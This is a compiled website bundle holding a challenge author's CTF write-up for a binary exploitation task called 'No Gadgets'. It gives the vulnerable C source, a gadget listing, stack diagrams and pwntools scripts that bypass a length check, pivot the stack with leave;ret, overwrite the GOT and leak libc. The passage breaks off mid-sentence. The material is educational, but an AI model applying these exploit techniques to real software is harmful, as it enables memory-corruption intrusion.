"use strict";(self.webpackChunkmy_website=self.webpackChunkmy_website||[]).push([[318],{2431:(e,n,t)=>{t.r(n),t.d(n,{assets:()=>a,contentTitle:()=>o,default:()=>h,frontMatter:()=>d,metadata:()=>r,toc:()=>l});const r=JSON.parse('{"id":"ctf-writeups/htb-business-2024/no-gadgets","title":"No Gadgets","description":"ROPing using `leave ; ret` rather than `pop rdi ; ret`","source":"@site/pwn/ctf-writeups/htb-business-2024/no-gadgets.mdx","sourceDirName":"ctf-writeups/htb-business-2024","slug":"/ctf-writeups/htb-business-2024/no-gadgets","permalink":"/ctf-writeups/htb-business-2024/no-gadgets","draft":false,"unlisted":false,"tags":[],"version":"current","sidebarPosition":1,"frontMatter":{"description":"ROPing using `leave ; ret` rather than `pop rdi ; ret`","sidebar_position":1},"sidebar":"tutorialSidebar","previous":{"title":"HTB Business 2024","permalink":"/category/htb-business-2024"},"next":{"title":"corCTF 2024","permalink":"/category/corctf-2024"}}');var s=t(4848),i=t(8453);const d={description:"ROPing using `leave ; ret` rather than `pop rdi ; ret`",sidebar_position:1},o="No Gadgets",a={},l=[{value:"Background",id:"background",level:2},{value:"Analysis",id:"analysis",level:2},{value:"Analyzing the source code",id:"analyzing-the-source-code",level:3},{value:"Protections",id:"protections",level:3},{value:"Intended Solution",id:"intended-solution",level:2},{value:"Disclaimer",id:"disclaimer",level:3},{value:"Exploitation",id:"exploitation",level:3},{value:"Bypass <code>strlen</code> check",id:"bypass-strlen-check",level:4},{value:"Finding gadgets",id:"finding-gadgets",level:3},{value:"Rough exploit plan",id:"rough-exploit-plan",level:4},{value:"Getting arbitrary writes",id:"getting-arbitrary-writes",level:3},{value:"Getting libc leak",id:"getting-libc-leak",level:4},{value:"Getting a shell",id:"getting-a-shell",level:3},{value:"Solver",id:"solver",level:3},{value:"Other solutions",id:"other-solutions",level:2},{value:"Neatest solution",id:"neatest-solution",level:3},{value:"Fun with (fun)lockfile",id:"fun-with-fun-lockfile",level:3},{value:"Who needs leaks anyway?",id:"who-needs-leaks-anyway",level:3},{value:"ret2dlresolve",id:"ret2dlresolve",level:3}];function c(e){const n={a:"a",code:"code",em:"em",h1:"h1",h2:"h2",h3:"h3",h4:"h4",header:"header",li:"li",p:"p",pre:"pre",strong:"strong",ul:"ul",...(0,i.R)(),...e.components};return(0,s.jsxs)(s.Fragment,{children:[(0,s.jsx)(n.header,{children:(0,s.jsx)(n.h1,{id:"no-gadgets",children:"No Gadgets"})}),"\n",(0,s.jsx)(n.h2,{id:"background",children:"Background"}),"\n",(0,s.jsxs)(n.p,{children:[(0,s.jsx)(n.code,{children:"No Gadgets"})," was an easy rated pwn I created for this CTF. The premise was based around the fact that ",(0,s.jsx)(n.code,{children:"pop rdi ; ret"})," is no longer present in binaries compiled against glibc ",(0,s.jsx)(n.code,{children:"2.34+"}),". While a lot of challenges will add this gadget back in manually, I wondered whether you could still solve an overflow challenge without this seemingly essential gadget."]}),"\n",(0,s.jsxs)(n.p,{children:["The process of crafting this challenge is what lead me to discover some of the techniques that I've detailed in ",(0,s.jsx)(n.a,{href:"../../pwn/rop-2.34+/the-problem",children:"this section"})," of my blog, including the ",(0,s.jsx)(n.code,{children:"gets"})," techniques."]}),"\n",(0,s.jsxs)(n.p,{children:["I decided that using ",(0,s.jsx)(n.code,{children:"gets"})," would make the challenge trivial, so I purposefully decided to not use it, instead opting for using ",(0,s.jsx)(n.code,{children:"leave ; ret"})," to control ",(0,s.jsx)(n.code,{children:"rbp"}),", which allowed you to get arbitrary writes to the ",(0,s.jsx)(n.code,{children:"GOT"}),"."]}),"\n",(0,s.jsx)(n.p,{children:"Anyways, enough yapping, onto the challenge itself."}),"\n",(0,s.jsx)(n.h2,{id:"analysis",children:"Analysis"}),"\n",(0,s.jsx)(n.h3,{id:"analyzing-the-source-code",children:"Analyzing the source code"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-c",children:'#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n\n#define BANNER \\\n"\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\\n" \\\n"\u2800\u28de\u28bd\u28aa\u28a3\u28a3\u28a3\u28ab\u287a\u2875\u28dd\u286e\u28d7\u28b7\u28bd\u28bd\u28bd\u28ee\u2877\u287d\u28dc\u28dc\u28ae\u28ba\u28dc\u28b7\u28bd\u289d\u287d\u28dd\\n" \\\n"\u2838\u2878\u281c\u2815\u2815\u2801\u2881\u2887\u288f\u28bd\u28ba\u28ea\u2873\u285d\u28ce\u28cf\u28af\u289e\u287f\u28df\u28f7\u28f3\u28af\u2877\u28fd\u28bd\u28af\u28f3\u28eb\u2807\\n" \\\n"\u2800\u2800\u2880\u2880\u2884\u28ac\u28aa\u286a\u284e\u28c6\u2848\u281a\u281c\u2815\u2807\u2817\u281d\u2895\u28af\u28ab\u28de\u28ef\u28ff\u28fb\u287d\u28cf\u2897\u28d7\u280f\u2800\\n" \\\n"\u2800\u282a\u286a\u286a\u28ea\u28aa\u28ba\u28b8\u28a2\u2893\u2886\u28a4\u2880\u2800\u2800\u2800\u2800\u2808\u288a\u289e\u287e\u28ff\u286f\u28cf\u28ae\u2837\u2801\u2800\u2800 \\n" \\\n"\u2800\u2800\u2800\u2808\u280a\u2806\u2843\u2815\u2895\u2887\u2887\u2887\u2887\u2887\u288f\u288e\u288e\u2886\u2884\u2800\u2891\u28fd\u28ff\u289d\u2832\u2809\u2800\u2800\u2800\u2800\\n" \\\n"\u2800\u2800\u2800\u2800\u2800\u287f\u2802\u2820\u2800\u2847\u2887\u2815\u2888\u28c0\u2800\u2801\u2821\u2823\u2863\u286b\u28c2\u28ff\u282f\u28aa\u2830\u2802\u2800\u2800\u2800\u2800\\n" \\\n"\u2800\u2800\u2800\u2800\u2866\u2859\u2842\u2880\u28a4\u28a3\u2823\u2848\u28fe\u2843\u2820\u2804\u2800\u2844\u28b1\u28cc\u28f6\u288f\u288a\u2802\u2800\u2800\u2800\u2800\u2800\u2800\\n" \\\n"\u2800\u2800\u2800\u2800\u289d\u2872\u28dc\u286e\u284f\u288e\u288c\u2882\u2819\u2822\u2810\u2880\u2898\u28b5\u28fd\u28ff\u287f\u2801\u2801\u2800\u2800\u2800\u2800\u2800\u2800\u2800\\n" \\\n"\u2800\u2800\u2800\u2800\u2828\u28fa\u287a\u2855\u2855\u2871\u2851\u2846\u2855\u2845\u2855\u285c\u287c\u28bd\u287b\u280f\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\\n" \\\n"\u2800\u2800\u2800\u2800\u28fc\u28f3\u28eb\u28fe\u28f5\u28d7\u2875\u2871\u2861\u28a3\u2891\u2895\u289c\u2895\u285d\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\\n" \\\n"\u2800\u2800\u2800\u28f4\u28ff\u28fe\u28ff\u28ff\u28ff\u287f\u287d\u2851\u288c\u282a\u2862\u2863\u28e3\u285f\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\\n" \\\n"\u2800\u2800\u2800\u285f\u287e\u28ff\u28bf\u28bf\u28b5\u28fd\u28fe\u28fc\u28d8\u28b8\u28b8\u28de\u285f\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\\n" \\\n"\u2800\u2800\u2800\u2800\u2801\u2807\u2821\u2829\u286b\u28bf\u28dd\u287b\u286e\u28d2\u28bd\u280b\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\\n" \\\n"\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014No gadgets?\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\\n"\n\nvoid setup() {\n\tsetvbuf(stdin, NULL, _IONBF, 0);\n\tsetvbuf(stdout, NULL, _IONBF, 0);\n\tsetvbuf(stderr, NULL, _IONBF, 0);\n}\n\nint main() {\n\tchar buf[0x80];\n\tsetup();\n\tputs(BANNER);\n\tputs("Welcome to No Gadgets, the ropping experience with absolutely no gadgets!");\n\tprintf("Data: ");\n\tfgets(buf, 0x1337, stdin);\n\tif (strlen(buf) > sizeof(buf)) {\n\t\tputs("Woah buddy, you\'ve entered so much data that you\'ve reached the point of no return!");\n\t\texit(EXIT_FAILURE);\n\t} else {\n\t\tputs("Pathetic, \'tis but a scratch!");\n\t}\n\treturn 0;\n}\n\n'})}),"\n",(0,s.jsxs)(n.p,{children:["The application is quite simple, it just prompts the user for input, and reads too much data onto the stack leading to a classic buffer overflow. It then checks the string length to check for a buffer overflow, and if an overflow is detected it ",(0,s.jsx)(n.code,{children:"exit"}),"s so that ",(0,s.jsx)(n.code,{children:"main"})," doesn't return. Otherwise it returns normally."]}),"\n",(0,s.jsx)(n.h3,{id:"protections",children:"Protections"}),"\n",(0,s.jsxs)(n.p,{children:["Running ",(0,s.jsx)(n.code,{children:"checksec"})," yields:"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{children:"    Arch:     amd64-64-little\n    RELRO:    Partial RELRO\n    Stack:    No canary found\n    NX:       NX enabled\n    PIE:      No PIE (0x3ff000)\n"})}),"\n",(0,s.jsxs)(n.p,{children:["So we're dealing with pretty standard protections, minus ",(0,s.jsx)(n.code,{children:"PIE"}),". The lack of canary and ",(0,s.jsx)(n.code,{children:"PIE"})," will make our overflow feasible, and no ",(0,s.jsx)(n.code,{children:"NX"})," means no shellcode (oh well, who needs shellcode anyways)."]}),"\n",(0,s.jsx)(n.h2,{id:"intended-solution",children:"Intended Solution"}),"\n",(0,s.jsx)(n.h3,{id:"disclaimer",children:"Disclaimer"}),"\n",(0,s.jsx)(n.p,{children:"The following is my intended solution, however after reading some of the other solutions from other players, I quickly realised that mine was overcomplicated. While they (mostly) used the same techniques that I wanted to cover, they were able to use them in a simpler and more concise way. I will briefly go over a few of them at the end."}),"\n",(0,s.jsx)(n.h3,{id:"exploitation",children:"Exploitation"}),"\n",(0,s.jsxs)(n.h4,{id:"bypass-strlen-check",children:["Bypass ",(0,s.jsx)(n.code,{children:"strlen"})," check"]}),"\n",(0,s.jsxs)(n.p,{children:["The first problem we face is the buffer overflow check, however fortunately for us this is a flimsy check. The string length is the number of bytes before a terminating null byte, however ",(0,s.jsx)(n.code,{children:"fgets"})," doesn't stop us from writing null bytes of our own, so we could place a null byte at the beginning of the buffer to force ",(0,s.jsx)(n.code,{children:"strlen"})," to return a value less than ",(0,s.jsx)(n.code,{children:"0x80"}),", hence bypassing the check."]}),"\n",(0,s.jsx)(n.h3,{id:"finding-gadgets",children:"Finding gadgets"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{children:"Gadgets information\n============================================================\n0x0000000000401077 : add al, 0 ; add byte ptr [rax], al ; jmp 0x401020\n0x0000000000401057 : add al, byte ptr [rax] ; add byte ptr [rax], al ; jmp 0x401020\n0x00000000004010eb : add bh, bh ; loopne 0x401155 ; nop ; ret\n0x0000000000401037 : add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x401020\n0x0000000000401270 : add byte ptr [rax], al ; add byte ptr [rax], al ; leave ; ret\n0x00000000004010b8 : add byte ptr [rax], al ; add byte ptr [rax], al ; nop dword ptr [rax] ; ret\n0x0000000000401271 : add byte ptr [rax], al ; add cl, cl ; ret\n0x000000000040115a : add byte ptr [rax], al ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret\n0x0000000000401039 : add byte ptr [rax], al ; jmp 0x401020\n0x0000000000401272 : add byte ptr [rax], al ; leave ; ret\n0x00000000004010ba : add byte ptr [rax], al ; nop dword ptr [rax] ; ret\n0x0000000000401034 : add byte ptr [rax], al ; push 0 ; jmp 0x401020\n0x0000000000401044 : add byte ptr [rax], al ; push 1 ; jmp 0x401020\n0x0000000000401054 : add byte ptr [rax], al ; push 2 ; jmp 0x401020\n0x0000000000401064 : add byte ptr [rax], al ; push 3 ; jmp 0x401020\n0x0000000000401074 : add byte ptr [rax], al ; push 4 ; jmp 0x401020\n0x0000000000401084 : add byte ptr [rax], al ; push 5 ; jmp 0x401020\n0x0000000000401009 : add byte ptr [rax], al ; test rax, rax ; je 0x401012 ; call rax\n0x000000000040115b : add byte ptr [rcx], al ; pop rbp ; ret\n0x0000000000401273 : add cl, cl ; ret\n0x00000000004010ea : add dil, dil ; loopne 0x401155 ; nop ; ret\n0x0000000000401047 : add dword ptr [rax], eax ; add byte ptr [rax], al ; jmp 0x401020\n0x000000000040115c : add dword ptr [rbp - 0x3d], ebx ; nop ; ret\n0x0000000000401157 : add eax, 0x2f0b ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret\n0x0000000000401067 : add eax, dword ptr [rax] ; add byte ptr [rax], al ; jmp 0x401020\n0x0000000000401013 : add esp, 8 ; ret\n0x0000000000401012 : add rsp, 8 ; ret\n0x00000000004011d3 : call qword ptr [rax + 0x4855c35d]\n0x0000000000401010 : call rax\n0x0000000000401173 : cli ; jmp 0x401100\n0x0000000000401170 : endbr64 ; jmp 0x401100\n0x000000000040100e : je 0x401012 ; call rax\n0x00000000004010e5 : je 0x4010f0 ; mov edi, 0x404040 ; jmp rax\n0x0000000000401127 : je 0x401130 ; mov edi, 0x404040 ; jmp rax\n0x000000000040103b : jmp 0x401020\n0x0000000000401174 : jmp 0x401100\n0x00000000004010ec : jmp rax\n0x0000000000401274 : leave ; ret\n0x00000000004010ed : loopne 0x401155 ; nop ; ret\n0x0000000000401156 : mov byte ptr [rip + 0x2f0b], 1 ; pop rbp ; ret\n0x0000000000401062 : mov dl, 0x2f ; add byte ptr [rax], al ; push 3 ; jmp 0x401020\n0x000000000040126f : mov eax, 0 ; leave ; ret\n0x00000000004010e7 : mov edi, 0x404040 ; jmp rax\n0x0000000000401052 : mov edx, 0x6800002f ; add al, byte ptr [rax] ; add byte ptr [rax], al ; jmp 0x401020\n0x0000000000401082 : movabs byte ptr [0x56800002f], al ; jmp 0x401020\n0x00000000004011d4 : nop ; pop rbp ; ret\n0x00000000004010ef : nop ; ret\n0x000000000040116c : nop dword ptr [rax] ; endbr64 ; jmp 0x401100\n0x00000000004010bc : nop dword ptr [rax] ; ret\n0x00000000004010e6 : or dword ptr [rdi + 0x404040], edi ; jmp rax\n0x0000000000401158 : or ebp, dword ptr [rdi] ; add byte ptr [rax], al ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret\n0x000000000040115d : pop rbp ; ret\n0x0000000000401036 : push 0 ; jmp 0x401020\n0x0000000000401046 : push 1 ; jmp 0x401020\n0x0000000000401056 : push 2 ; jmp 0x401020\n0x0000000000401066 : push 3 ; jmp 0x401020\n0x0000000000401076 : push 4 ; jmp 0x401020\n0x0000000000401086 : push 5 ; jmp 0x401020\n0x0000000000401016 : ret\n0x0000000000401042 : ret 0x2f\n0x0000000000401022 : retf 0x2f\n0x000000000040100d : sal byte ptr [rdx + rax - 1], 0xd0 ; add rsp, 8 ; ret\n0x0000000000401279 : sub esp, 8 ; add rsp, 8 ; ret\n0x0000000000401278 : sub rsp, 8 ; add rsp, 8 ; ret\n0x000000000040100c : test eax, eax ; je 0x401012 ; call rax\n0x00000000004010e3 : test eax, eax ; je 0x4010f0 ; mov edi, 0x404040 ; jmp rax\n0x0000000000401125 : test eax, eax ; je 0x401130 ; mov edi, 0x404040 ; jmp rax\n0x000000000040100b : test rax, rax ; je 0x401012 ; call rax\n\nUnique gadgets found: 68\n"})}),"\n",(0,s.jsxs)(n.p,{children:["Due to the program being compiled to run on glibc versions 2.34 and above, the ",(0,s.jsx)(n.code,{children:"__libc_csu_init"})," function is ",(0,s.jsx)(n.a,{href:"../../pwn/rop-2.34+/the-problem#where-does-pop-rdi-ret-come-from",children:"no longer present"}),", and so most of the useful ",(0,s.jsx)(n.code,{children:"pop"})," gadgets are gone, like ",(0,s.jsx)(n.code,{children:"pop rdi ; ret"}),". This stops us using the classic ",(0,s.jsx)(n.code,{children:"ret2plt"})," attack, where we can call ",(0,s.jsx)(n.code,{children:"puts"})," on some address containing a libc address, to get a leak. Instead we need to leak libc using ROP in a different way, and for that we need other gadgets."]}),"\n",(0,s.jsxs)(n.p,{children:["Most of the gadgets found by ",(0,s.jsx)(n.code,{children:"ROPgadget"})," aren't very useful, except for ",(0,s.jsx)(n.code,{children:"leave ; ret"}),". This is a gadget found at the end of some functions, like ",(0,s.jsx)(n.code,{children:"main"})," in this case, which aids in switching between stack frames. It does this by restoring the old ",(0,s.jsx)(n.code,{children:"rbp"})," of the calling function (saved base pointer), moving ",(0,s.jsx)(n.code,{children:"rsp"})," up and returning. ",(0,s.jsx)(n.code,{children:"leave"})," is effectively"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-asm",children:"mov rsp, rbp\npop rbp\n"})}),"\n",(0,s.jsxs)(n.p,{children:[(0,s.jsx)(n.code,{children:"rbp"})," here points to the saved base pointer, so moving it into ",(0,s.jsx)(n.code,{children:"rsp"})," allows it to then be popped into ",(0,s.jsx)(n.code,{children:"rbp"}),". Then the return address is stored directly afterwards, so then the ",(0,s.jsx)(n.code,{children:"ret"})," returns to the previous code."]}),"\n",(0,s.jsx)(n.p,{children:"Example (some function called by main):"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{children:"        |------------------------|\n        |     return address     |\n        |------------------------|\n  ----\x3e |   saved base pointer   |\n  |     |------------------------|\n  |     |                        |\n  |     |     char buf[0x80]     |\n  |     |                        |\n  |     |------------------------|\n  |     |     return address     |  <--- [rbp+8]\n  |     |------------------------|\n  ------|   saved base pointer   |  <--- [rbp]\n        |------------------------|\n        |                        |\n        |     local variables    |\n        |                        |\n        |------------------------|  <--- [rsp]\n"})}),"\n",(0,s.jsxs)(n.p,{children:["After ",(0,s.jsx)(n.code,{children:"leave ; ret"}),":"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{children:"\n        |------------------------|\n        |     return address     |  <--- [rbp+8]\n        |------------------------|\n  ----\x3e |   saved base pointer   |  <--- [rbp]\n  |     |------------------------|\n  |     |                        |\n  |     |     char buf[0x80]     |\n  |     |                        |\n  |     |------------------------|  <--- [rsp]\n  |     |     return address     |\n  |     |------------------------|\n  ------|   saved base pointer   |\n        |------------------------|\n        |                        |\n        |     local variables    |\n        |                        |\n        |------------------------|\n"})}),"\n",(0,s.jsxs)(n.p,{children:["If you want more info, you can go ",(0,s.jsx)(n.a,{href:"../../pwn/rop-2.34+/controlling-rbp#what-is-the-saved-base-pointer",children:"here"}),"."]}),"\n",(0,s.jsx)(n.h4,{id:"rough-exploit-plan",children:"Rough exploit plan"}),"\n",(0,s.jsxs)(n.p,{children:[(0,s.jsx)(n.code,{children:"rbp"})," is used to keep track of where the variables stored in a stack frame are. You can see this in action when looking at the disassembly. The following is from the call to ",(0,s.jsx)(n.code,{children:"fgets"}),"."]}),"\n",(0,s.jsxs)("figure",{children:[(0,s.jsx)("img",{src:"/assets/fgets.png",alt:""}),(0,s.jsx)("figcaption",{children:(0,s.jsxs)("p",{children:[(0,s.jsx)("code",{children:"fgets"})," gadget"]})})]}),"\n",(0,s.jsxs)(n.p,{children:["The address of the buffer is relative to ",(0,s.jsx)(n.code,{children:"rbp"})," (as would other variables, if there were others)."]}),"\n",(0,s.jsxs)(n.p,{children:["In our buffer overflow, we don't only overwrite the return address, but also the saved base pointer, which would then get loaded into ",(0,s.jsx)(n.code,{children:"rbp"}),", due to ",(0,s.jsx)(n.code,{children:"leave"}),". So with our overflow, we can control ",(0,s.jsx)(n.code,{children:"rbp"}),", and we also have the above gadget which writes arbitrary data to the buffer at ",(0,s.jsx)(n.code,{children:"[rbp-0x80]"}),", so combining these theoretically grants an arbitrary write."]}),"\n",(0,s.jsxs)(n.p,{children:["But what to overwrite? Remember we don't have a leak, so we're limited to the binary's memory. Recall that the binary has ",(0,s.jsx)(n.code,{children:"Partial RELRO"}),", which means the ",(0,s.jsx)(n.code,{children:"GOT"})," is writable!"]}),"\n",(0,s.jsxs)(n.p,{children:["An appealing target is ",(0,s.jsx)(n.code,{children:"strlen@GOT"}),", because it's a function that takes one argument: our buffer! So we could either:"]}),"\n",(0,s.jsxs)(n.ul,{children:["\n",(0,s.jsxs)(n.li,{children:["overwrite ",(0,s.jsx)(n.code,{children:"strlen@GOT -> puts@PLT"})," and point ",(0,s.jsx)(n.code,{children:"buf"})," to a ",(0,s.jsx)(n.code,{children:"GOT"})," entry"]}),"\n",(0,s.jsxs)(n.li,{children:["overwrite ",(0,s.jsx)(n.code,{children:"strlen@GOT -> printf@PLT"})," and point ",(0,s.jsx)(n.code,{children:"buf"})," to a format string"]}),"\n"]}),"\n",(0,s.jsxs)(n.p,{children:["Once we have a libc leak, the ret2libc should be trivial, because libc has a ",(0,s.jsx)(n.code,{children:"pop rdi"})," gadget."]}),"\n",(0,s.jsx)(n.h3,{id:"getting-arbitrary-writes",children:"Getting arbitrary writes"}),"\n",(0,s.jsxs)("figure",{children:[(0,s.jsx)("img",{src:"/assets/got (1).png",alt:""}),(0,s.jsx)("figcaption",{children:(0,s.jsx)("p",{children:(0,s.jsx)("code",{children:"GOT"})})})]}),"\n",(0,s.jsxs)(n.p,{children:["So to get an arbitrary write onto ",(0,s.jsx)(n.code,{children:"strlen@GOT"}),", we'll need to set ",(0,s.jsx)(n.code,{children:"rbp"})," to ",(0,s.jsx)(n.code,{children:"&strlen@GOT + 0x80"})," (since the ",(0,s.jsx)(n.code,{children:"fgets"})," gadget uses ",(0,s.jsx)(n.code,{children:"[rbp-0x80]"}),"), and ",(0,s.jsx)(n.code,{children:"rip"})," to the ",(0,s.jsx)(n.code,{children:"fgets"})," gadget. This is easily done in the first overflow, but then what? Well we'll run through the rest of the main function and hit ",(0,s.jsx)(n.code,{children:"leave ; ret"})," again. Running through what ",(0,s.jsx)(n.code,{children:"leave"})," does, we see that it copies ",(0,s.jsx)(n.code,{children:"rbp"})," to ",(0,s.jsx)(n.code,{children:"rsp"}),", then pops ",(0,s.jsx)(n.code,{children:"rbp"})," and ",(0,s.jsx)(n.code,{children:"rip"}),". Since ",(0,s.jsx)(n.code,{children:"rbp"})," is ",(0,s.jsx)(n.code,{children:"0x80"})," bytes after our data input, we can use the overflow to control ",(0,s.jsx)(n.code,{children:"rbp"})," and ",(0,s.jsx)(n.code,{children:"rip"})," again! (and we can do this for any ",(0,s.jsx)(n.code,{children:"rbp"}),")"]}),"\n",(0,s.jsx)(n.p,{children:"However we run into a problem when going with this approach."}),"\n",(0,s.jsxs)("figure",{children:[(0,s.jsx)("img",{src:"/assets/writable_memory.png",alt:""}),(0,s.jsx)("figcaption",{children:(0,s.jsx)("p",{children:"Writable memory of the binary"})})]}),"\n",(0,s.jsxs)(n.p,{children:["If we wrote to the earliest possible address ",(0,s.jsx)(n.code,{children:"0x404000"}),", then ",(0,s.jsx)(n.code,{children:"rbp = 0x404080"}),". But the entries for ",(0,s.jsx)(n.code,{children:"stdin"}),", ",(0,s.jsx)(n.code,{children:"stdout"}),", ",(0,s.jsx)(n.code,{children:"stderr"})," are between our write and ",(0,s.jsx)(n.code,{children:"rbp"}),", and since we don't have a libc leak, we can't overwrite these without corrupting them and causing a crash."]}),"\n",(0,s.jsxs)(n.p,{children:["This is why we need to make another write to ",(0,s.jsx)(n.code,{children:"0x404080"})," first, to fill in a fake saved ",(0,s.jsx)(n.code,{children:"rbp"})," and ",(0,s.jsx)(n.code,{children:"rip"}),"."]}),"\n",(0,s.jsx)(n.p,{children:"A naive approach to implement the above could look as follows:"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-py",children:'#!/usr/bin/python3\nfrom pwn import *\n\ne = ELF("./vuln")\nlibc = ELF("./libc.so.6")\np = e.process()\n\nleave_ret = e.sym.main+157\nfgets_gadget = e.sym.main+68\n\noverflow  = b"\\x00".ljust(0x80, b"A")\noverflow += p64(0x404080+0x80)\noverflow += p64(fgets_gadget)\np.sendline(overflow)\n\ngdb.attach(p)\nfake_rbp_rip  = p64(0xdead) + p64(0xbeef)     # blank for now!\nfake_rbp_rip  = fake_rbp_rip.ljust(0x80, b"A")\nfake_rbp_rip += p64(0x404000+0x80)\nfake_rbp_rip += p64(fgets_gadget)\np.sendline(fake_rbp_rip)\n\noverwrite  = p64(e.plt.puts + 6)\noverwrite += p64(e.plt.puts)        # strlen@GOT\noverwrite += p64(e.plt.printf + 6)\noverwrite += p64(e.plt.fgets + 6)\n\np.sendline(overwrite)\np.interactive()\n'})}),"\n",(0,s.jsx)(n.p,{children:"This will fail for another reason (which isn't due to my incompetence (hopefully!)), which is easier to see in gdb."}),"\n",(0,s.jsxs)("figure",{children:[(0,s.jsx)("img",{src:"/assets/gdb1.png",alt:""}),(0,s.jsx)("figcaption",{children:(0,s.jsxs)("p",{children:["Before ",(0,s.jsx)("code",{children:"GOT"})," overwrite"]})})]}),"\n",(0,s.jsxs)(n.p,{children:["Here we get to the point where we're about to overwrite the ",(0,s.jsx)(n.code,{children:"GOT"})," with fgets, but see something interesting. Since we've done multiple ",(0,s.jsx)(n.code,{children:"leave"}),"s, we've stack pivoted to the writable region. This on its own isn't a huge deal, but since it's so close to all the important addresses in the ",(0,s.jsx)(n.code,{children:"GOT"}),", there's a good chance that the stack usage for the call to ",(0,s.jsx)(n.code,{children:"fgets"})," will clobber them."]}),"\n",(0,s.jsxs)("figure",{children:[(0,s.jsx)("img",{src:"/assets/gdb2.png",alt:""}),(0,s.jsx)("figcaption",{children:(0,s.jsxs)("p",{children:["After ",(0,s.jsx)("code",{children:"GOT"})," overwrite. The telescope view shows that the ",(0,s.jsx)("code",{children:"GOT"})," is clobbered by the stack variables."]})})]}),"\n",(0,s.jsx)(n.p,{children:"And clobber them it does!"}),"\n",(0,s.jsxs)(n.p,{children:["So we need to be more careful about where ",(0,s.jsx)(n.code,{children:"rsp"})," is. Fortunately most functions used in ",(0,s.jsx)(n.code,{children:"main"})," don't use that much stack space (except for ",(0,s.jsx)(n.code,{children:"printf"}),", which we can skip), so as long as ",(0,s.jsx)(n.code,{children:"rsp"})," is further along in the writable region, its stack usage won't clobber anything. We can achieve this by using an extra ",(0,s.jsx)(n.code,{children:"leave ; ret"}),"."]}),"\n",(0,s.jsxs)(n.p,{children:["Recall that after ",(0,s.jsx)(n.code,{children:"leave ; ret"}),", ",(0,s.jsx)(n.code,{children:"rsp"})," points to directly after the saved rbp and rip (due to popping), and since we want ",(0,s.jsx)(n.code,{children:"rsp"})," at a higher address, we can place our own saved ",(0,s.jsx)(n.code,{children:"rbp"})," and ",(0,s.jsx)(n.code,{children:"rip"})," pairs at high addresses. Then for the initial ",(0,s.jsx)(n.code,{children:"leave ; ret"})," (at the end of main), we set ",(0,s.jsx)(n.code,{children:"rbp"})," to point to that pair, and ",(0,s.jsx)(n.code,{children:"rip"})," to ",(0,s.jsx)(n.code,{children:"leave ; ret"}),". That way we control ",(0,s.jsx)(n.code,{children:"rbp"})," and ",(0,s.jsx)(n.code,{children:"rip"}),", while also having ",(0,s.jsx)(n.code,{children:"rsp"})," be far enough to prevent clobbering!"]}),"\n",(0,s.jsx)(n.h4,{id:"getting-libc-leak",children:"Getting libc leak"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-py",children:'#!/usr/bin/python3\nfrom pwn import *\n\ne = ELF("./vuln")\nlibc = ELF("./libc.so.6")\np = e.process()\n\nleave_ret = e.sym.main+157\nfgets_gadget = e.sym.main+68\n\nhigh_addr = 0x404800\n\noverflow  = b"\\x00".ljust(0x80, b"A")\noverflow += p64(high_addr+0x80)\noverflow += p64(fgets_gadget)\np.sendlineafter(b"Data: ", overflow)\np.recvline()\n\n\noverflow  = b"\\x00".ljust(0x80, b"A")\noverflow += p64(0x404080+0x80)\noverflow += p64(fgets_gadget)\n# rbp,rip pair at high address\noverflow += p64(0x404000+0x80)\noverflow += p64(fgets_gadget)\np.sendline(overflow)\np.recvline()\n\ngdb.attach(p)\nfake_rbp_rip  = p64(0xdead) + p64(0xbeef)     # blank for now!\nfake_rbp_rip  = fake_rbp_rip.ljust(0x80, b"A")\nfake_rbp_rip += p64(high_addr+0x90)\nfake_rbp_rip += p64(leave_ret)\np.sendline(fake_rbp_rip)\np.recvline()\n\noverwrite  = p64(e.plt.puts + 6)\noverwrite += p64(e.plt.puts)        # strlen@GOT\noverwrite += p64(e.plt.printf + 6)\noverwrite += p64(e.plt.fgets + 6)\n\np.sendline(overwrite)\n\nlibc_leak = u64(p.recv(6) + b"\\x00\\x00")\nlog.info(f"puts: {hex(libc_leak)}")\n\nlibc.address = libc_leak - libc.sym.puts\nlog.info(f"libc: {hex(libc.address)}")\n\np.interactive()\n'})}),"\n",(0,s.jsxs)(n.p,{children:["Applying this gives us the script above, which successfully leaks libc base. We overwrite ",(0,s.jsx)(n.code,{children:"strlen@GOT"})," to ",(0,s.jsx)(n.code,{children:"puts@PLT"})," (not ",(0,s.jsx)(n.code,{children:"printf@PLT"})," because it uses a lot of stack space), and after we overwrite ",(0,s.jsx)(n.code,{children:"GOT"}),", ",(0,s.jsx)(n.code,{children:"strlen"})," gets called. The way it's set up is that ",(0,s.jsx)(n.code,{children:"buf -> puts@GOT"}),", which is now ",(0,s.jsx)(n.code,{children:"puts@PLT + 6"}),". But when ",(0,s.jsx)(n.code,{children:"strlen"})," gets called, ",(0,s.jsx)(n.code,{children:"puts"})," is called, which resolves ",(0,s.jsx)(n.code,{children:"puts@GOT"})," in time for 